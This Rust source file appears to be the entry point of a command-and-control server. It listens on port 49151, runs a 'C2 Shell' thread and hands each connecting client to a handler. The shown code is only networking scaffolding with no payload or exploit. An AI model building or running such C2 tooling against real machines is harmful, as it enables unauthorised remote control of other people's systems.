mod client;
mod terminal;

use std::io::{BufRead, Write};
use std::net::TcpListener;
use std::{io, thread};
use std::error::Error;
use serde::{Deserialize, Serialize};


use client::ClientManager;
use terminal::{cli_server, handle_client};


/// Entry point for the server application.
///
/// Initializes a TCP server that listens on port 49151, manages client connections,
/// and spawns threads for various tasks including handling client data, listening for
/// heartbeats, and monitoring client connections.
fn main() {
    let listener = TcpListener::bind("0.0.0.0:49151").unwrap();
    // println!("[I] Server listening on port 49151");
    io::stdout().flush().unwrap();

    let client_manager: ClientManager = ClientManager::new();

    // Thread for the C2 Shell
    let server_client_manager_clone = client_manager.clone();
    thread::spawn(|| cli_server(server_client_manager_clone));

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                // Thread that handle the communication with this client
                let client_manager_clone = client_manager.clone();
                //let ip = stream.peer_addr().unwrap().to_string();
                thread::spawn(move || {
                    handle_client(stream, client_manager_clone);
                });

            },
            Err(e) => {
                println!("[E] Error while listening for new connections: {}", e);
            }
        }
    }
}










